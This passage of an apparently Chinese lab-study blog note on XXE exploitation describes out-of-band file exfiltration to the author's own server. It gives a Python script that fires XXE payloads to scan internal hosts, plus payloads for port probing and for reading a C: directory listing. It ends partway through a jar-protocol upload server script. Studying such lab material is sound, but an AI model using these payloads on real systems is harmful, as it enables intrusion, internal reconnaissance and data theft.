&lt;p&gt;其参数实体的调用为：首先在报文中调用dtd实体，dtd实体存在于我们的服务器，dtd实体中调用payload实体，而payload实体为 对send实体的定义，这样便从我们的服务器导入了send实体的定义，最后在报文中调用send实体，send实体的内容为 向我们的服务器发起GET请求，请求的内容为file实体，以此将file实体中的文件内容通过GET请求发送到我们的服务器。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624095155024-a55f5eb3-e70b-4339-9cee-53836c276bf3.png#align=left&amp;amp;display=inline&amp;amp;height=1750&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.32.16.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;size=1558301&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-19 下午5.32.16.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;（本图回复包中的报错还没有搞清楚……正常的回复包应该只有包头，不过也可以看到，在回复包的报错中也爆出了请求的内容）&lt;br &#x2F;&gt;可以看到，在发出请求包之后，我们的服务器马上收到了带有GET请求内容的请求包&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624095426851-005374ea-5a69-43e5-b1d9-55084f2b36fc.png#align=left&amp;amp;display=inline&amp;amp;height=222&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.36.55.png&amp;amp;originHeight=222&amp;amp;originWidth=1290&amp;amp;size=159149&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1290&quot; alt=&quot;截屏2021-06-19 下午5.36.55.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;最后将收到的内容进行base64解码，即可得到flag值&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624095550592-60bb7dba-8cfc-4fb9-96e7-eacb210de7ed.png#align=left&amp;amp;display=inline&amp;amp;height=1750&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.38.57.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;size=346635&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-19 下午5.38.57.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624095585953-f94f217b-3dbf-413b-86a2-68840c5e6af8.png#align=left&amp;amp;display=inline&amp;amp;height=410&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-19%20%E4%B8%8B%E5%8D%885.39.31.png&amp;amp;originHeight=410&amp;amp;originWidth=722&amp;amp;size=75769&amp;amp;status=done&amp;amp;style=none&amp;amp;width=722&quot; alt=&quot;截屏2021-06-19 下午5.39.31.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;xxetan-ce-nei-wang-duan-kou&quot;&gt;XXE探测内网端口&lt;&#x2F;h2&gt;
&lt;p&gt;这里利用XXE作为跳板，向目标主机所在内网发送请求，看是否有回应&lt;br &#x2F;&gt;这里引用笔记最后推荐的一篇好文章的探测内网的部分&lt;&#x2F;p&gt;
&lt;p&gt;我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 文件以后我们就有了大致的探测方向了&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;下面是一个探测脚本的实例：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;base64
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#Origtional XML that the server accepts
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#&amp;lt;xml&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#    &amp;lt;stuff&amp;gt;user&amp;lt;&#x2F;stuff&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#&amp;lt;&#x2F;xml&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;build_xml&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    xml = &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    xml = xml + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    xml = xml + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot; + &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + string + &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;gt;]&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    xml = xml + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;xml&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    xml = xml + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &amp;quot;&amp;quot;&amp;quot;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;stuff&amp;gt;&amp;amp;xxe;&amp;lt;&#x2F;stuff&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    xml = xml + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;xml&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_xml&lt;&#x2F;span&gt;&lt;span&gt;(xml)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;send_xml&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    headers = {&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-Type&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;application&#x2F;xml&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;}
&lt;&#x2F;span&gt;&lt;span&gt;    x = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;34.200.157.128&#x2F;CUSTOM&#x2F;NEW_XEE.php&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;=xml, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;headers&lt;&#x2F;span&gt;&lt;span&gt;=headers, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;timeout&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;).text
&lt;&#x2F;span&gt;&lt;span&gt;    coded_string = x.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39; &amp;#39;)[-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# a little split to get only the base64 encoded value
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;coded_string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#   print base64.b64decode(coded_string)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;255&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        i = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(i)
&lt;&#x2F;span&gt;&lt;span&gt;        ip = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;10.0.0.&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + i
&lt;&#x2F;span&gt;&lt;span&gt;        string = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource=http:&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + ip + &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;string
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_xml&lt;&#x2F;span&gt;&lt;span&gt;(string)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;返回结果：&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;strong&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624120165579-f2e65864-56ba-422c-a6af-4aad3acf262e.png#align=left&amp;amp;display=inline&amp;amp;height=311&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=311&amp;amp;originWidth=902&amp;amp;size=259745&amp;amp;status=done&amp;amp;style=none&amp;amp;width=902&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;strong&gt;&lt;br &#x2F;&gt;找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测&lt;br &#x2F;&gt;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;strong&gt;比如我们传入：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;  
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SYSTEM &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;127.0.0.1:515&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; [  
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ELEMENT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;#PCDATA&lt;&#x2F;span&gt;&lt;span&gt;)&amp;gt;  
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;4&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;返回结果：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;javax.xml.bind.UnmarshalException  
&lt;&#x2F;span&gt;&lt;span&gt; - with linked exception:
&lt;&#x2F;span&gt;&lt;span&gt;[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
&lt;&#x2F;span&gt;&lt;span&gt;Exception Description: An error occurred unmarshalling the document  
&lt;&#x2F;span&gt;&lt;span&gt;Internal Exception: ████████████████████████: Connection refused
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;如下图所示：&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;strong&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624120397352-2d1f2223-3687-4ee9-90c6-2d56e3af07d6.png#align=left&amp;amp;display=inline&amp;amp;height=379&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=379&amp;amp;originWidth=884&amp;amp;size=84940&amp;amp;status=done&amp;amp;style=none&amp;amp;width=884&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）&lt;&#x2F;p&gt;
&lt;h2 id=&quot;javaxiang-mu-xxelou-dong-huo-qu-fu-wu-qi-mi-ma&quot;&gt;Java项目XXE漏洞获取服务器密码&lt;&#x2F;h2&gt;
&lt;p&gt;不知道为什么，metasploit无法捕获，已经尝试两天了，决定放弃了，以后再看看吧……&lt;&#x2F;p&gt;
&lt;h2 id=&quot;javazhong-jarxie-yi-shang-chuan-wen-jian&quot;&gt;Java中jar协议上传文件&lt;&#x2F;h2&gt;
&lt;p&gt;通过xxe读取文件目录&lt;br &#x2F;&gt;（tomcat下的XXE.war环境）&lt;br &#x2F;&gt;抓包改包，将发送包改为如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;POST &#x2F;XXE&#x2F;doLogin HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.43.231:8080
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 167
&lt;&#x2F;span&gt;&lt;span&gt;Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q=0.01
&lt;&#x2F;span&gt;&lt;span&gt;X-Requested-With: XMLHttpRequest
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;xml;charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;Origin: http:&#x2F;&#x2F;192.168.43.231:8080
&lt;&#x2F;span&gt;&lt;span&gt;Referer: http:&#x2F;&#x2F;192.168.43.231:8080&#x2F;XXE&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Language: zh-CN,zh;q=0.9
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;user[&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY baz SYSTEM &amp;quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;baz;&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可在回复包中得到c盘的文件目录&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624290735854-36bbf5e6-1885-41f1-b8c1-42354e789e46.png#align=left&amp;amp;display=inline&amp;amp;height=1762&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-21%20%E4%B8%8B%E5%8D%8811.51.53.png&amp;amp;originHeight=1762&amp;amp;originWidth=2696&amp;amp;size=608846&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-21 下午11.51.53.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;若要查看子目录，只要更改目录即可。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;通过jar协议上传文件（如下实验需要一台远程服务器，这里为kali）&lt;br &#x2F;&gt;&lt;strong&gt;在kali主机内进行如下操作&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;首先需要使用一个python脚本来开启服务，脚本如下：&lt;br &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;sys 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;threading 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;socketserver 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;urllib.parse &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;quote 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;http.client &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;httpc 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;listen_host = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;192.168.0.110&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; 
&lt;&#x2F;span&gt;&lt;span&gt;listen_port = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9999 
&lt;&#x2F;span&gt;&lt;span&gt;jar_file = sys.argv[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;JarRequestHandler&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;socketserver.BaseRequestHandler&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):  
